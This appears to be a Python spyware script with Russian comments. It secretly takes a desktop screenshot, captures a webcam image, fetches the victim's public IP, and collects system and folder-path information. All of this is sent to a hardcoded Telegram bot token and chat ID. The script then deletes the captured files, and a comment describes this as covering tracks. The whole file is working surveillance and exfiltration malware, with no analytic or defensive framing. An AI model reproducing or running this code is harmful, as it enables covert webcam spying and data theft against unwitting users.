import pyautogui, telebot, requests, os, cv2, platform
from pyautogui import *

#Тг бот апи
bot = telebot.TeleBot('5037530316:AAED3LAjta2ohk38ZAcoSdGA1rwXEHkP_hg')
#Cкрин стола
screenshot = pyautogui.screenshot()
screenshot.save('screen.png')
#Айпишник
ip = requests.get('http://fsystem88.ru/ip').text
#Захват вебки
cap = cv2.VideoCapture(0)
for i in range(30):
    cap.read()
ret, frame = cap.read()
cv2.imwrite('cam.png', frame)
cap.release()
#Отправка данных боту
o = os.environ
bot.send_photo(1134632256, screenshot, caption='Screenshot from screen')
f = open('cam.png', 'rb')
bot.send_photo(1134632256, f, caption='Camera)))')
bot.send_message(1134632256, f'''IP:{ip}, \n''')
bot.send_message(1134632256, f'''System information:
System:{platform.uname().system} Version:{platform.uname().version}. \n\nПапки:
Буква основного диска:  {o['HOMEDRIVE']}
Папка Юзера:  {o['HOMEPATH']}


''')
bot.send_message(1134632256, 'Остальные папки и пути:\n\n'+o['PATH'])
#Заметание улик(Жаль не всех)
os.system('del screen.png')
f.close()
os.remove('cam.png')